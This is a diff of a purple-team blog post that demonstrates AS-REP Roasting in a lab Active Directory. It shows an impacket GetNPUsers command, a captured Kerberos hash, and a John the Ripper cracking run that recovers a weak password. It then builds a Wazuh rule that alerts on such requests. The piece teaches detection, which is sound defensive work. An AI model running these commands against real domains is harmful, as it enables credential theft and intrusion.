@@ -5,9 +5,9 @@ categories: [Purple Team,Active Directory & Kerberos Abuse]
 tags: [active directory,asrep roasting,hashcat]     # TAG names should always be lowercase
 comments: true
 image:
-  path: /.
+  path: /./media/post5/kerberos.png
 ---
-Hello everyone, thank you for being here. In this blog post, I will demonstrate and simulate a very interesting Active Directory and Kerberos abuse attack: the **AS-REP Roasting** attack. So, let's get started!
+Hello everyone, thank you for being here. In this blog post, I will demonstrate and simulate a very classic yet interessting Active Directory and Kerberos abuse attack: the **AS-REP Roasting** attack. So, let's get started!
 ## What is Kerberos ?
 Kerberos is a network authentication protocol designed to provide strong authentication for client-server applications using ticket-based cryptography. Developed by MIT, it is the default authentication mechanism in Microsoft Active Directory (AD) environments.
 ### Kerberos components :
@@ -40,28 +40,23 @@ this image below represents the kerberos flaw, as stated before :
 
 ## AS_REP Roasting :
 **AS-REP Roasting** exploits a weakness in Kerberos when **pre-authentication** is disabled for a user account. Without pre-authentication, an attacker can request a TGT (no password aka anyone can) for the user and receive an encrypted AS-REP message, which can be cracked offline to reveal the user’s password. Luckily in **Kerberos v5** the preauth is enabled by default and you have to manually disable it, the only reason i think sys admin would disble it is for backward compatibility with Kerberos v4 libraries that might be used by some legacy applications,those account by default do not require a password.
-## Lab Simulation: AS-REP Roasting Attack Demonstration :
-In this practical demonstration, we'll simulate an **AS-REP Roasting** attack in our test environment and identify **key Indicators of Compromise (IOCs)** that would alert defenders to such malicious activity.
+## ATTACK Simulation (AS-REP Roasting Attack Demonstration) :
+In this practical demonstration, we'll simulate an **AS-REP Roasting** attack in our test environment and identify **key Indicators of Attack (IoAs)** that would alert defenders to such malicious activity.
 
 **Lab Environment Details:**
 
-- Target Domain: **b2hu.local**
+- Target Domain: **iccn.ma**
 
-- Vulnerable Account: **jdoe@b2hu.local** (pre-authentication disabled)
-
-- Alternative Format: **b2hu/jdoe**
+- Vulnerable Account: **iccn.ma/jdoe** (pre-authentication disabled)
 the **jdoe** user properties must be set up with preauth disabled just as follows : 
 ![screen_2](/./media/post5/jdoe_prop.png)
 
-### Attacking the DC
+### Attack
 for the asrep abuse we'll use the impacket script **GetNPUsers.py** script :
 ```shell
-impacket-GetNPUsers -no-pass b2hu.local/jdoe -dc-ip 10.120.116.9
+impacket-GetNPUsers -no-pass iccn.ma/jdoe -dc-ip 10.0.2.16 
 ```
-after execuring this command we'll get the tgt encrypted wiht the user jdoe password's hash, just as follows :
-```shell
-$krb5asrep$23$jdoe@B2HU.LOCAL:653ff5ebc4ad4664ca981a81d99e5d25$230752522416c1b67374660dbe8adbf5676915d8ecf69c2b2b8907857752d022a43d7cb7b5d86466c8298052ca13fb73691beee998ff6b24adfa1e9e0e0d7849b6b5b50ed9e82a40a1aec478f860ab251a910db20538503dd112acf3ed6615d499db123454a494bbc0d6e68aa920e9242ed3816f4ae3869736f9a2a018d7f3a131e8e89badbe5d7f78378a82c1cd709892c3ae53c42c1b09ff22df294900a937db02cf02d9d4cda4614bbaef163f2b9683ec205978af08111ac5b891e2c8cebf10f63964ea53bac74643fd4b9ae67df13715d93799266caa919fe567c42e52a086b5f5a4eadc372f
-```
+after execuring this command we'll get the ASREP (TGT + Session key), the session key is the one that's encrypted wiht the user jdoe password's hash.
 now we can move to offline cracking, we can use tools like hashcat or JTR (john the ripper), for this demo i'll user JTP with rockyou.txt password list, the command is like this : 
 ```shell
 john --wordlist=/usr/share/wordlists/rockyou.txt tgt.txt 
@@ -72,16 +67,61 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-Password123      ($krb5asrep$23$jdoe@B2HU.LOCAL)     
+Password123      ($krb5asrep$23$jdoe@ICCN.MA)     
 1g 0:00:00:00 DONE (2025-04-28 23:28) 6.250g/s 211200p/s 211200c/s 211200C/s katten..redlips
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
-as we can see the password of the **b2hu/jdoe** user is **Password123** 
+as we can see the password of the **iccn/jdoe** user is **Password123** 
 and just like that the attacker has now a foothold in your domaina and can perfom even more enumeration to find weakspots.
 
-### Detecting & respond the Attack
 
-while requesting the tgt ticket the windows event log, 
+## Detect & respond the Attack Using _Wazuh_
 
+every TGT Request to the DC is logged with this **4768**, remember it because we'll need it later when we create detection rules in **_wazuh_**. You can see the event in windows event viewer just like this :
+
+![screen_3](/./media/post5/windows_event.png)
+
+The objective of this detection is to generate alerts whenever an **unauthorized IP** makes a **TGT request** to Domain Controller (DC) accounts that have **pre-authentication disabled**. To achieve this, we'll use Wazuh and its powerful capabilities for customizing detection rules and variables.
+
+By default, Wazuh includes a rule for TGT requests; however, it is set at level 0, which means it does not generate alerts. Instead of modifying this built-in rule, we'll create a child rule that triggers whenever the parent rule fires. This approach gives us better control and flexibility over the detection logic.
+
+Let’s analyze the following rule:
+
+```xml
+<var name="acc_no_pre_auth">jdoe</var>
+<group name="security_event, windows,">
+  <rule id="110002" level="12">
+    <if_sid>60103</if_sid>
+    <field name="win.system.eventID">^4768$</field>
+    <field name="win.eventdata.TargetUserName">$acc_no_pre_auth</field>
+    <match name="win.eventdata.IpAddress" negate="yes">10.0.2.17</match>
+    <options>no_full_log</options>
+    <description>Possible ASREP Roast Attack from $(win.eventdata.IpAddress) to a no-preauth account: $(win.eventdata.TargetUserName)</description>
+    <mitre>
+        <id>T1558.004</id>
+    </mitre>
+    <info type="link">https://attack.mitre.org/techniques/T1558/004/</info>
+  </rule>
+</group>
+````
+This child rule (ID: 110002) is triggered when its parent rule (60103) is matched. It includes conditions aligned with our detection objective:
+
+1. It only triggers if the **TargetUserName** matches an account with pre-authentication disabled, defined in the variable **$acc_no_pre_auth**.
+2. It ensures the IpAddress is not equal to the legitimate IP address **10.0.2.17**.
+
+The generated alert includes useful metadata like the MITRE ATT&CK technique ID and a link for further reading.
+
+Next, we simulate the attack from a Linux machine with the IP address 10.0.2.20:
+
+![screen_4](/./media/post5/ifconfig.png)
+After using the Impacket script (as in the previous attack simulation). In the Wazuh Dashboard, we can observe that an alert was successfully generated:
+![screen_5](/./media/post5/alert.png)
+we can further inspect the content of the alert using drilldowns 
+![screen_6](/./media/post5/desc_1.png)
+
+## Conclusion
+This detection strategy successfully leverages Wazuh’s rule customization and variable substitution capabilities to detect **ASREP Roasting** attacks. By creating a child rule that monitors for TGT requests to accounts with preauthentication disabled—only from unauthorized IPs— we ensure targeted and meaningful alerts without modifying Wazuh’s built-in rules. This approach enhances flexibility and maintains rule integrity. As demonstrated, a simulated ASREP Roasting attempt from an untrusted IP triggered a precise alert, confirming the effectiveness of this method in identifying potential lateral movement or credential dumping attacks in an Active Directory environment.
+
+I hope You have enjoyed reading this blog post,f you have any questions or need help implementing a similar setup, feel free to ask!
 
